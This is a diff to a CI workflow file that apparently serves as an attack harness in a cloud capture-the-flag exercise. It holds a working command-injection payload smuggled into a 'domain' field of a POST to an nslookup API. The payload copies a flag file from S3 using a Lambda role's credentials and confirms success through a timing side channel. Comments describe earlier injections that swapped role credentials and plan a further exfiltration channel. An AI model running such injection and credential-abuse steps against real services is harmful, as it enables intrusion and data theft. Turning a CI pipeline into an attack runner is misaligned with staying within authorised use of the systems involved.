@@ -85,15 +85,15 @@ jobs:
           curl -s -o /dev/null -w "HTTP %{http_code}\n" https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
           curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
 
-      - name: Exploit - read flag using timing side-channel
+      - name: Exploit - read flag using lambdaRole native creds + timing exfil
         run: |
-          echo "Bucket policy restricts writes to lambdaRole/CTFExecutionRole only."
-          echo "Strategy: lambdaRole CAN read (VPC condition satisfied). Use timing to exfil."
-          echo "Payload: if flag copy succeeds -> sleep 10s, else sleep 1s"
-          INJECT="x; (aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && sleep 10 && cat /tmp/flag.txt | wc -c) || (echo 'FAILED'; sleep 1) #"
+          echo "Fix: Previous injections OVERRODE lambdaRole creds with cicdRole creds."
+          echo "lambdaRole is in bucket policy (with VPC condition), cicdRole is NOT."
+          echo "Now: Use lambdaRole's NATIVE credentials (don't inject cicdRole)."
+          INJECT="x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && sleep 15 && cat /tmp/flag.txt | wc -c || sleep 1 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
 
-          echo "--- Sending timing-based exfil payload ---"
+          echo "--- Sending lambda-native-creds exfil payload ---"
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" \
@@ -102,10 +102,11 @@ jobs:
           ELAPSED_MS=$(( (END - START) / 1000000 ))
 
           echo "Response time: ${ELAPSED_MS}ms"
-          if [ $ELAPSED_MS -gt 5000 ]; then
-            echo "SUCCESS SIGNAL: took >5s, flag copy likely succeeded!"
+          if [ $ELAPSED_MS -gt 10000 ]; then
+            echo "SUCCESS: took >10s, flag copy succeeded! Flag is in /tmp/flag.txt on Lambda."
+            echo "Next step: exfil /tmp/flag.txt content via another channel."
           else
-            echo "FAILED SIGNAL: took <2s, flag copy likely failed"
+            echo "FAILED: took ~1s, flag copy failed (still permission issue or wrong VPC)"
           fi
 
       - name: Read Lambda CloudWatch logs for RCE diagnostics
